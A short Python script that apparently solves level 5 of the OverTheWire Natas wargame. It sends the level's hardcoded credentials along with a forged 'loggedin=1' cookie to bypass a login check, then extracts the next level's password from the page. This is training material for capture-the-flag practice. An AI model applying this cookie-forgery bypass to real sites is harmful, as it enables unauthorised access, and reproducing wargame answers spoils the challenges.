import requests
import re

url = "http://natas5.natas.labs.overthewire.org/"
user = "natas5"
password = "Z0NsrtIkJoKALBCLi5eqFfcRN82Au2oD"

cookies = {"loggedin":"1"}

s = requests.Session()
s.auth = (user, password)

r = s.get(url, cookies=cookies)

result = re.findall(r"The password for natas6 is (.*)</div>", r.text)[0]

print(f"Natas6:{result}")
